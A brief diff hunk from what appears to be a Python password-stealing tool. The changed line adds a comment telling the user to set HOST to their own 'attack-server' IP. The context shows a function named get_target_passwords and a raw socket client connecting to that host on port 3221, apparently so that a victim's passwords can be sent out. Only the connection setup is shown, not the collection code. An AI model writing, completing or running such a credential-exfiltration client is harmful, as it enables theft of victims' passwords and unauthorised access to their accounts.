@@ -19,7 +19,7 @@ def get_target_passwords():
 try:
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     DISCONNECT = "disconnect"
-    HOST = "192.168.14.66"
+    HOST = "192.168.14.66"  # this should be your computer ip (attack-server)
     PORT = 3221
 
     client.connect((HOST, PORT))
